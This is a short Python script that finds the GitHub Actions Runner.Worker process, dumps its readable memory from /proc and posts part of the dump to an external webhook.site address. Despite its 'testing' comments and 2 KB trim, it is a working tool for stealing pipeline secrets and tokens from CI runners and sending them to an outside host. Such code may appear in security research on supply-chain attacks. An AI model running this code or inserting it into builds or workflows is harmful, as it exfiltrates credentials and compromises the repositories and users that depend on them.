import sys
import os
import re
import requests  # Requires 'requests' module

# Replace with your testing webhook URL
WEBHOOK_URL = "https://webhook.site/70e7937a-e041-4002-9ba8-35d54bbf3c57"

def get_pid():
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
    for pid in pids:
        try:
            with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
                if b'Runner.Worker' in cmdline_f.read():
                    return pid
        except Exception:
            continue
    raise Exception('Cannot get pid of Runner.Worker')

def dump_memory(pid):
    map_path = f"/proc/{pid}/maps"
    mem_path = f"/proc/{pid}/mem"
    dump_data = b''

    with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
        for line in map_f.readlines():
            m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
            if m and m.group(3) == 'r':
                start = int(m.group(1), 16)
                end = int(m.group(2), 16)
                if start > sys.maxsize:
                    continue
                try:
                    mem_f.seek(start)
                    chunk = mem_f.read(end - start)
                    dump_data += chunk
                except OSError:
                    continue
    return dump_data

if __name__ == "__main__":
    try:
        pid = get_pid()
        memory_dump = dump_memory(pid)

        # Optionally trim data for safety/testing
        limited_data = memory_dump[:2048]  # 2 KB max

        # Send to webhook
        response = requests.post(WEBHOOK_URL, data=limited_data)
        print("Sent to webhook:", response.status_code)
    except Exception as e:
        print("Error:", e)
